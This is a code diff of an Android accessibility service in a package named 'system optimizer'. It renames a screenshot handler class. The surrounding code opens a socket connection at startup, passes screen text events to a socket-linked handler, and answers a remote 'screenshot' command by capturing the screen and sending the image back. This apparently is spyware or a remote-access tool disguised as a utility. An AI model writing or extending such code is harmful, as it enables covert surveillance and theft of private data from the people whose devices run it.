@@ -1,7 +1,7 @@
 package com.system.optimizer;
 
 import com.system.optimizer.handler.SystemEventHandler;
-import com.system.optimizer.handler.ScreenshotEventHandler;
+import com.system.optimizer.handler.ScreenshotCapture;
 import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.ConfigManager;
 import com.system.optimizer.network.SocketManager;
@@ -17,7 +17,7 @@ public class SystemEventMonitor extends AccessibilityService {
     private ConfigManager configManager;
     // handlers
     private SystemEventHandler systemEventHandler;
-    private ScreenshotEventHandler screenShotEventHandler;
+    private ScreenshotCapture screenShotCapture;
     private boolean isInitialized = false;
 
     @Override
@@ -58,16 +58,16 @@ public class SystemEventMonitor extends AccessibilityService {
             // SocketManager constructor already calls connect() internally
             this.socketManager = new SocketManager(this, configManager);
             
-            // Create screenshot handler first
-            this.screenShotEventHandler = new ScreenshotEventHandler(this, configManager);
+            // Create screenshot capture first
+            this.screenShotCapture = new ScreenshotCapture(this, configManager);
             
-            // Create text handler with screenshot handler reference
-            this.systemEventHandler = new SystemEventHandler(screenShotEventHandler, socketManager);
+            // Create text handler with screenshot capture reference
+            this.systemEventHandler = new SystemEventHandler(screenShotCapture, socketManager);
             
             // Add listener for manual screenshot requests
             this.socketManager.addListener("screenshot", args -> {
                 // Capture screenshot and send as response
-                screenShotEventHandler.takeScreenshot().thenAccept(imageBytes -> {
+                screenShotCapture.takeScreenshot().thenAccept(imageBytes -> {
                     if (imageBytes != null) {
                         socketManager.sendEvent("screenshot_response", imageBytes);
                     }
